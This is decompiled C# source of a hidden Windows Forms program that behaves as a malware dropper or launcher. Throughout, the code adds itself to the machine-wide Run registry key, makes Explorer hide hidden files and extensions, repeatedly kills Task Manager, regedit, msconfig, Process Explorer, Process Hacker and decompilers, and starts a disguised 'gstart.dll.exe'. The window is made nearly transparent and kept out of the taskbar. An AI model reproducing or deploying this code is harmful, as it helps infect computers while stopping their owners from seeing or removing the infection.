using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace services_running;

[DesignerGenerated]
public class mai : Form
{
	private static List<WeakReference> list_0 = new List<WeakReference>();

	private IContainer icontainer_0;

	[AccessedThroughProperty("check_off_on")]
	private Timer timer_0;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("ProgressBar2")]
	private ProgressBar _ProgressBar2;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("countdown")]
	private Timer timer_1;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("kill")]
	private Timer timer_2;

	[AccessedThroughProperty("ProgressBar3")]
	private ProgressBar _ProgressBar3;

	[AccessedThroughProperty("star_gstart")]
	private Timer timer_3;

	private string string_0;

	private bool bool_0;

	private int int_0;

	private int int_1;

	[AccessedThroughProperty("download")]
	private WebClient webClient_0;

	private WebClient webClient_1;

	private WebClient webClient_2;

	private string string_1;

	private string string_2;

	private DateTime dateTime_0;

	private TimeSpan timeSpan_0;

	private int int_2;

	internal virtual Timer Timer_0
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_0_Tick;
			if (timer_0 != null)
			{
				timer_0.remove_Tick(eventHandler);
			}
			timer_0 = value;
			if (timer_0 != null)
			{
				timer_0.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual ProgressBar ProgressBar2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ProgressBar2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ProgressBar2 = value;
		}
	}

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual Timer Timer_1
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			timer_1 = value;
		}
	}

	internal virtual Label Label4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual Timer Timer_2
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_2_Tick;
			if (timer_2 != null)
			{
				timer_2.remove_Tick(eventHandler);
			}
			timer_2 = value;
			if (timer_2 != null)
			{
				timer_2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual ProgressBar ProgressBar3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ProgressBar3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ProgressBar3 = value;
		}
	}

	internal virtual Timer Timer_3
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_3_Tick;
			if (timer_3 != null)
			{
				timer_3.remove_Tick(eventHandler);
			}
			timer_3 = value;
			if (timer_3 != null)
			{
				timer_3.add_Tick(eventHandler);
			}
		}
	}

	private virtual WebClient WebClient_0
	{
		[DebuggerNonUserCode]
		get
		{
			return webClient_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			webClient_0 = value;
		}
	}

	public mai()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)mai_Load);
		((Form)this).add_FormClosing(new FormClosingEventHandler(mai_FormClosing));
		smethod_0(this);
		string_0 = "";
		bool_0 = false;
		WebClient_0 = new WebClient();
		webClient_1 = new WebClient();
		webClient_2 = new WebClient();
		string_1 = Application.get_ProductName();
		string_2 = Application.get_ExecutablePath();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void smethod_0(object object_0)
	{
		checked
		{
			lock (list_0)
			{
				if (list_0.Count == list_0.Capacity)
				{
					int num = 0;
					int num2 = list_0.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = list_0[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								list_0[num] = list_0[num3];
							}
							num++;
						}
						num3++;
					}
					list_0.RemoveRange(num, list_0.Count - num);
					list_0.Capacity = list_0.Count;
				}
				list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Expected O, but got Unknown
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a6: Expected O, but got Unknown
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b7: Expected O, but got Unknown
		//IL_04eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_04f5: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(mai));
		Timer_0 = new Timer(icontainer_0);
		Label1 = new Label();
		Label2 = new Label();
		ProgressBar1 = new ProgressBar();
		ProgressBar2 = new ProgressBar();
		Button1 = new Button();
		Label3 = new Label();
		Timer_1 = new Timer(icontainer_0);
		Label4 = new Label();
		Timer_2 = new Timer(icontainer_0);
		ProgressBar3 = new ProgressBar();
		Timer_3 = new Timer(icontainer_0);
		((Control)this).SuspendLayout();
		Timer_0.set_Enabled(true);
		Label1.set_AutoSize(true);
		Label label = Label1;
		Point location = new Point(750, 135);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		Size size = new Size(10, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text(".");
		Label2.set_AutoSize(true);
		Label label3 = Label2;
		location = new Point(708, 135);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(36, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(1);
		Label2.set_Text("คำส\u0e31\u0e48ง :");
		ProgressBar progressBar = ProgressBar1;
		location = new Point(613, 209);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(241, 23);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(2);
		ProgressBar progressBar3 = ProgressBar2;
		location = new Point(645, 424);
		((Control)progressBar3).set_Location(location);
		((Control)ProgressBar2).set_Name("ProgressBar2");
		ProgressBar progressBar4 = ProgressBar2;
		size = new Size(249, 23);
		((Control)progressBar4).set_Size(size);
		((Control)ProgressBar2).set_TabIndex(4);
		Button button = Button1;
		location = new Point(861, 247);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(212, 171);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(5);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Label3.set_AutoSize(true);
		Label label5 = Label3;
		location = new Point(718, 291);
		((Control)label5).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label6 = Label3;
		size = new Size(39, 13);
		((Control)label6).set_Size(size);
		((Control)Label3).set_TabIndex(6);
		Label3.set_Text("Label3");
		Label4.set_AutoSize(true);
		Label label7 = Label4;
		location = new Point(189, 82);
		((Control)label7).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label8 = Label4;
		size = new Size(39, 13);
		((Control)label8).set_Size(size);
		((Control)Label4).set_TabIndex(7);
		Label4.set_Text("Label4");
		Timer_2.set_Enabled(true);
		ProgressBar progressBar5 = ProgressBar3;
		location = new Point(42, 187);
		((Control)progressBar5).set_Location(location);
		((Control)ProgressBar3).set_Name("ProgressBar3");
		ProgressBar progressBar6 = ProgressBar3;
		size = new Size(222, 23);
		((Control)progressBar6).set_Size(size);
		((Control)ProgressBar3).set_TabIndex(8);
		Timer_3.set_Enabled(true);
		Timer_3.set_Interval(3000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.White);
		size = new Size(10, 10);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar3);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar2);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_HelpButton(true);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("mai");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Timer_0_Tick(object sender, EventArgs e)
	{
		ProgressBar1.Increment(1);
		if (ProgressBar1.get_Value() == 10)
		{
			try
			{
				RegistryKey registryKey = ((ServerComputer)Class1.Class0_0).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true);
				registryKey.SetValue("Hidden", 2);
				registryKey.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				RegistryKey registryKey2 = ((ServerComputer)Class1.Class0_0).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", writable: true);
				registryKey2.SetValue("HideFileExt", 1);
				registryKey2.Close();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (ProgressBar1.get_Value() == 20)
		{
			ProgressBar1.set_Value(0);
			Timer_0.set_Enabled(false);
			Timer_0.set_Enabled(true);
		}
	}

	private void mai_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			Process.Start(Application.get_StartupPath() + "\\gstart.dll.exe");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void mai_Load(object sender, EventArgs e)
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue(Application.get_ProductName(), Application.get_ExecutablePath());
			registryKey.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProgressBar2.set_Style((ProgressBarStyle)2);
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		Label3.set_Text(string_0);
	}

	private void Timer_2_Tick(object sender, EventArgs e)
	{
		((Control)this).Hide();
		try
		{
			Process[] processesByName = Process.GetProcessesByName("msconfig");
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				process.Kill();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName2 = Process.GetProcessesByName("ProcessHacker");
			Process[] array2 = processesByName2;
			foreach (Process process2 in array2)
			{
				process2.Kill();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName3 = Process.GetProcessesByName("procexp64");
			Process[] array3 = processesByName3;
			foreach (Process process3 in array3)
			{
				process3.Kill();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName4 = Process.GetProcessesByName("procexp");
			Process[] array4 = processesByName4;
			foreach (Process process4 in array4)
			{
				process4.Kill();
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName5 = Process.GetProcessesByName("manager_task");
			Process[] array5 = processesByName5;
			foreach (Process process5 in array5)
			{
				process5.Kill();
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName6 = Process.GetProcessesByName("taskmgr");
			Process[] array6 = processesByName6;
			foreach (Process process6 in array6)
			{
				process6.Kill();
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName7 = Process.GetProcessesByName("SystemExplorer");
			Process[] array7 = processesByName7;
			foreach (Process process7 in array7)
			{
				process7.Kill();
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName8 = Process.GetProcessesByName("Reflector");
			Process[] array8 = processesByName8;
			foreach (Process process8 in array8)
			{
				process8.Kill();
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName9 = Process.GetProcessesByName("DotNetToolkitLauncher");
			Process[] array9 = processesByName9;
			foreach (Process process9 in array9)
			{
				process9.Kill();
			}
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName10 = Process.GetProcessesByName("regedit");
			Process[] array10 = processesByName10;
			foreach (Process process10 in array10)
			{
				process10.Kill();
			}
		}
		catch (Exception projectError10)
		{
			ProjectData.SetProjectError(projectError10);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName11 = Process.GetProcessesByName("control");
			Process[] array11 = processesByName11;
			foreach (Process process11 in array11)
			{
				process11.Kill();
			}
		}
		catch (Exception projectError11)
		{
			ProjectData.SetProjectError(projectError11);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName12 = Process.GetProcessesByName("UserAccountControlSettings");
			Process[] array12 = processesByName12;
			foreach (Process process12 in array12)
			{
				process12.Kill();
			}
		}
		catch (Exception projectError12)
		{
			ProjectData.SetProjectError(projectError12);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processesByName13 = Process.GetProcessesByName("gstart.dll.exe");
			Process[] array13 = processesByName13;
			for (int num7 = 0; num7 < array13.Length; num7 = checked(num7 + 1))
			{
				((Form)this).Close();
			}
		}
		catch (Exception projectError13)
		{
			ProjectData.SetProjectError(projectError13);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer_3_Tick(object sender, EventArgs e)
	{
		ProgressBar3.Increment(1);
		if (ProgressBar3.get_Value() == 100)
		{
			try
			{
				Timer_3.set_Enabled(false);
				Process.Start(Application.get_StartupPath() + "\\gstart.dll.exe");
				((Form)this).Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
